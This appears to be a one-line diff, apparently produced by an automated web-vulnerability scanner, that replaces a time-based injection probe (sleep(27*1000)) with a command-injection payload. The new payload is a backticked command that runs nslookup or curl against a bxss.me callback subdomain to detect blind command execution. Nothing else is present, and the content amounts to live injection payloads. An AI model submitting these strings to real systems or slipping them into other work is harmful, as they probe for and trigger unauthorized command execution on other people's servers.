@@ -1,1 +1,1 @@
-555'&&sleep(27*1000)*nznthz&&'
+`(nslookup -q=cname hitblgapusgogff95d.bxss.me||curl hitblgapusgogff95d.bxss.me)`
